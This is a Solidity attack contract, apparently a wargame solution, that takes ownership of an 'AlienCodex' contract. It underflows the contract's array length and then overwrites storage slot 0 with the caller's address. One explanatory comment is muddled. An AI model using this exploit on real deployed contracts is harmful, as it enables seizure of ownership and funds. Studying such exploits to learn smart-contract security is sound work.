pragma solidity ^0.5.0;

import "hardhat/console.sol";

interface IAlienCodex {
    function make_contact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;

    function record(bytes32 _content) external;
}

contract AlienCodexAttack {
    function attack(address _target) public {
        IAlienCodex target = IAlienCodex(_target); //

        target.make_contact();

        // Underflow the array length making it the max value of uint256.
        // This allows to write an element into ANY slot.
        target.retract();

        // Calculate element index such that keccak256(codex.slot) + element index = 0
        // 0 is the slot number of the owner variable
        // Element slot = keccak256(array.slot) + element index
        // Element address = keccak256(keccak256(array.slot) + element index)
        target.revise(
            (2**256 - 1) -
                uint256(keccak256(abi.encodePacked(uint256(0x01)))) +
                1,
            bytes32(uint256(msg.sender))
        );
    }
}
